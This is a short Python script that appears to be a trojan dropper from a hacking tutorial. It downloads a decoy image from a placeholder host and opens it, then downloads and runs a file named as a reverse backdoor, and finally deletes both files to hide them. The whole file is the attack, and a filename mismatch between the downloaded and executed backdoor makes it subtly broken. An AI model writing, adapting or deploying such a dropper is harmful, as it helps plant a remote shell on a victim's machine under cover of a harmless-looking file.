#!/usr/bin/env python
import requests, subprocess, smtplib, os, tempfile

def download(url):
    get_request = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name,"wb") as out_file:
        out_file.write(get_request.content)




temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("ip_adress/image.jpg") #we use for example image
subprocess.Popen("image.jpg", shell=True)

download("ip_adress/recerse_backdoor.exe") #we use for example backdoor code
subprocess.call("reverse_backdoor.exe", shell=True)


os.remove("image.jpg")
os.remove("reverse_backdoor.exe")
